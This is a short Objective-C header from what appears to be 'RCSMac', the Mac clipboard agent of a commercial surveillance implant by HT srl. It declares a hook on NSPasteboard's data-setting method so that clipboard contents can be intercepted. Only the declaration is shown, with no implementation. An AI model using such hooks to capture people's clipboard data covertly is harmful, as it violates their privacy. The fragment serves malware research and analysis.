/*
 * RCSMac - Clipboard Agent
 * 
 *
 * Created by Massimo Chiodini on 17/06/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>

#import "RCSMInterface.h"

@interface NSPasteboard (clipboardHook) 

- (BOOL)setDataHook:(NSData *)data forType:(NSString *)dataType;

@end
